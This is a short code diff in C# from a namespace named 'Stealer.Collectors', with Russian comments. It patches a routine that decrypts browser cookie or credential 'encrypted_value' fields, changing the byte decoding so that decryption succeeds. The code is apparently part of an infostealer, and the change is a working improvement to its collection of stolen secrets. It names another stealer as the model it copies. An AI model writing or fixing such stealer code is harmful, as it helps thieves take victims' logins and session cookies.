@@ -333,8 +333,8 @@ namespace Stealer.Collectors
                         // Если plain value пустой - расшифровываем encrypted_value
                         else if (!string.IsNullOrEmpty(encryptedValueStr))
                         {
-                            // Конвертируем строку обратно в байты (как в InteliX)
-                            byte[] encryptedValue = Encoding.Default.GetBytes(encryptedValueStr);
+                            // Конвертируем строку обратно в байты безопасно (без потери байтов > 127)
+                            byte[] encryptedValue = Encoding.GetEncoding("iso-8859-1").GetBytes(encryptedValueStr);
                             
                             if (encryptedValue.Length >= 31)
                             {
